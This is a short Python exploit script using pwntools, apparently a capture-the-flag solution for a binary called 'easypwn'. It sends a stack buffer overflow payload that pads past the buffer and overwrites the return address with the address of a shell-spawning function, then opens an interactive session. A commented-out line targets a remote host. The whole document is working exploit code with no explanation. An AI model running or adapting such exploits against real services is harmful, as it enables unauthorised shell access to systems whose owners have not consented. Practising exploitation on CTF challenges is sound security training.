#coding = utf-8

from pwn import *

#context(arch="amd64",os="linux")

#r = remote("129.211.58.26",10000)
r=process('./easypwn')

r.recvuntil("Plz input letter exactly!")

sh_address=0x4006b6

payload= (0x70+0x8)*'a'+p64(sh_address)

r.sendline(payload)

r.interactive()
